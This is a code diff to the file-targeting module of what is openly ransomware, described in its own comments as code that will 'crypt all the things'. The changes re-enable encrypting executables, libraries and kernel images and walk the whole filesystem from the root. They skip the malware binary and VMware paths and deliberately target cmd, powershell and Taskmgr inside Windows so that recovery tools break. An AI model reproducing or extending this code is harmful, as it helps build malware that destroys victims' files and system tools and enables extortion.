@@ -1,6 +1,8 @@
 #!/usr/bin/env python
 import os
 
+
+
 def discoverFiles(startpath):
     '''
     Walk the path recursively down from startpath, and perform method on matching files.
@@ -22,8 +24,10 @@ def discoverFiles(startpath):
     # that is: Encrypting all files of all the below types should leave a system in a bootable state,
     # BUT applications which depend on such resources may become broken.
     # This will not cover all files, but it should be a decent range.
+
+    # not using this because I want to crypt all the things
     extensions = [
-        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+         'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
         'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
         'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
         'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
@@ -36,19 +40,34 @@ def discoverFiles(startpath):
         'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
         'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
         'java', 'class', 'jar', # java source code
-        'ps', 'bat', 'vb', # windows based scripts
+        'ps1', 'bat', 'vb', # windows based scripts
         'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
         'go', 'py', 'pyc', 'bf', 'coffee', # other source code files
 
         'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
     ]
 
+    SPECIAL_FILES = ['cmd', 'powershell', 'Taskmgr']
+
     for dirpath, dirs, files in os.walk(startpath):
         for i in files:
             absolute_path = os.path.abspath(os.path.join(dirpath, i))
-            ext = absolute_path.split('.')[-1]
-            if ext in extensions:
+            # don't want to crypt the malware itself
+            if 'main.exe' in absolute_path:
+                continue
+            # don't want to crypt VMWare drivers
+            if 'VMware' in absolute_path:
+                continue
+            # don't want to crypt system files. Need the OS to still work
+            if 'Windows' not in absolute_path:
+                print(absolute_path)
                 yield absolute_path
+            else:
+                # but it would be nice if somethings didn't work
+                for f in SPECIAL_FILES:
+                    if f in absolute_path:
+                        yield absolute_path
+
 
 if __name__ == "__main__":
     x = discoverFiles('/')
